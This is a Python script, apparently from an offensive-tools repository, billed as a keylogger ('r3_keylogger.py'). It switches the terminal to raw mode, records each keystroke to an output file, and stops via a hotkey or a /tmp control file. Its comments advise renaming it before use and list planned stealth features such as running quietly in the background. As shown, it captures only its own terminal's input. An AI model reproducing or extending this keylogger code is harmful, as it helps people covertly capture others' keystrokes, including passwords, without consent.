#!/usr/bin/env python3

import sys, os;
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../_lib")));

#======================================================================
#
# Brought to you by ~ r3dg0bl1n <(¬‿¬)>
# v/ 0.1-alpha
#
# --------------------------- INSTRUCTIONS ----------------------------
# Usage: python3 r3_keylogger.py -f output.txt [-v] [-d]
# -f : Defines the output file. *REQ*
# -v : Prints output on shell.
# -d : Allows to terminate process pressing "º" key.
# (?) : To stop execution create the empty file "/tmp/r3ctrl".
# ------------------------------ NOTES --------------------------------
# For god's sake, change the script name if you are gonna use it.
# ---------------------------- DISCLAIMER -----------------------------
# Use only with explicit permission of the system owner.
# Breaking things or getting arrested is on you, I'm just a goblin.
# ----------------------------- LICENSE -------------------------------
# Licensed under the MIT License (see LICENSE file in repo).
#======================================================================

#============================ ALPHA TABLE =============================
#------------------------------- bugs ---------------------------------
# [X] Throws ugly error message on Thread exit.
#----------------------------- features -------------------------------
# [ ] Compatible on Windows.
# [X] Clean thread exit.
# [ ] Run on background quietly.
# [ ] Command help and usage output
#======================================================================
#----------------------------------------------------------------------
#\ PRE

import r3, time, threading as th;
from r3 import ERR;

_core = r3.Core(sys.argv, { 
    "-f%": True,
    "-v": False,
    "-d": False,
});
_core.set_err({
    3: "Could not open output file",
});

_core.check_format(); # EXIT
_stp = th.Event();

#/ PRE
#----------------------------------------------------------------------
#\ H - Essentials

if os.name == "nt":
    import msvcrt
    def getch():
        return msvcrt.getch();
else:
    import tty, termios as tm;
    def getch():
        fd = sys.stdin.fileno();
        ost = tm.tcgetattr(fd);
        try:
            tty.setraw(fd);
            ch = sys.stdin.read(1);
        finally: tm.tcsetattr(fd, tm.TCSADRAIN, ost);
        return ch;

#/ H - Essentials
#----------------------------------------------------------------------
#\ SRC - Functions

def reg():
    try:
        while not _stp.is_set():
            k = getch();
            if k in ("\r", "\r\n"):
                of.write("\n");
                if _core.arg("v"): print("");
            elif _core.arg("d") and k == "\u00BA":
                _stp.set();
            else:
                of.write(k);
                if _core.arg("v"): print(k, end="", flush=True);
            of.flush();
    finally:
        if os.path.exists("/tmp/r3ctrl"): os.remove("/tmp/r3ctrl");
        of.write("\n");
        of.close();
        _core.stop(ERR.NO_ERROR); # EXIT

def ctrl():
    while True:
        if os.path.exists("/tmp/r3ctrl"):
            _stp.set(); # EXIT
            break;
        time.sleep(1);

#/ SRC - Functions
#----------------------------------------------------------------------
#\ SRC - Body

if os.path.exists("/tmp/r3ctrl"): os.remove("/tmp/r3ctrl");

of = None;
try: of = open(f"{_core.arg("f")}", "a");
except IOError as e: _core.stop(3); # EXIT

t0 = th.Thread(target=ctrl, daemon=True);
t0.start();

of.write("=============== NEW SESSION ===============\n");
reg();   

#/ SRC - Body
#----------------------------------------------------------------------

# =====================================================================
# Soy español, ¿a qué quieres que te gane?